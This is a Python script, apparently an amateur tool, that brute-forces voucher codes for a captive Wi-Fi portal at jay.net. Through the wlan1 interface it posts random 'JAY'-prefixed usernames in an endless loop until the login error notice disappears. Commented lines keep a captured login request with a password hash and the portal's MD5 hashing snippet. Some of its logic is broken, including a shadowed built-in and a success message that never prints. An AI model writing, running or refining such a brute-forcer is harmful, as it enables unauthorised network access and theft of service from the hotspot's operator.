#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# OpenSource2022 
# Copyright By System╳
#####################################################
import string 										#
import socket 										#
import os                                           #
import urllib3                                      #
import random                                       #
import sys                                          #
import time                                         #
import datetime                                     #
import requests                                     #
from bs4 import BeautifulSoup                       #
                                                    #
#COLOR                                              #
G = "\033[0;32m"                                    #
GI = "\033[0;32;3m"                                 #
B = "\033[0;36;1m"                                  #
BI = "\033[0;36;3m"                                 #
R = "\033[0;31m"                                    #
RI = "\033[31;3m"                                   #
Y = "\033[33;1m"                                    #
YI = "\033[33;1;3m"                                 #
W = "\033[37;1m"                                    #
WI = "\033[37;1;3m"                                 #
N = "\033[0m"                                       #
NI = "\033[0;3m"                                    #
#####################################################



# def Invalid_Voucher():
            
        

class HTTPAdapterWithSocketOptions(requests.adapters.HTTPAdapter):
    def __init__(self, *args, **kwargs):
        self.socket_options = kwargs.pop("socket_options", None)
        super(HTTPAdapterWithSocketOptions, self).__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        if self.socket_options is not None:
            kwargs["socket_options"] = self.socket_options
        super(HTTPAdapterWithSocketOptions, self).init_poolmanager(*args, **kwargs)

interface = 'wlan1'
adapter = HTTPAdapterWithSocketOptions(socket_options=[(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode('utf-8'))])
session = requests.session()
session.mount("http://", adapter)
session.mount("https://", adapter)


def str(length=8):
    text= string.ascii_letters
    return ''.join(random.choice(text)for i in range(length))
while 1:        
    txt=str(4)    
    num= random.randrange(3,6)
    generated = "JAY{}{}".format(num,txt)
    data= {
        "username" : generated
        # "dst" : ""
        # "popup" : "true"
    }
    r= session.post('http://jay.net/login', params=data)
    Soup = BeautifulSoup(r.text, 'html.parser')
    print("Trying ==> {}".format(data))
    try:
	    Try_findText = Soup.find('div', class_="notice").text
	    if Try_findText:
	        continue
    except requests.exceptions.ConnectionError:
        '''
        if the connection error, or perhaps no internet connection 
        this function IDK why, if this function running it will be skip number of wordlist

        '''
        print(NI+'░░░▒▒▒▓▓▓███'+YI+'[ Estabilishing connection ]'+NI+'███▓▓▓▒▒▒░░░'+N)
        time.sleep(0.2)
        continue
    else:
	    break
    print ("The Voucher is{}".format(data))
# for i in range(100):
    

# print(r.text)
# url = "http://jay.net/login"

# r = requests.get(url)
# print (r.text)

# document.sendin.password.value = hexMD5('\277' + document.login.password.value +
#                     '\303\113\260\175\106\041\267\274\005\031\014\167\337\034\175\070');
# pas= d19f43fb39b00467fd7a654849c24a18
'''
data


username=JAY3DEF7H&password=6fc6056cf3542b39a847452115584ba9&dst=&popup=true
'''


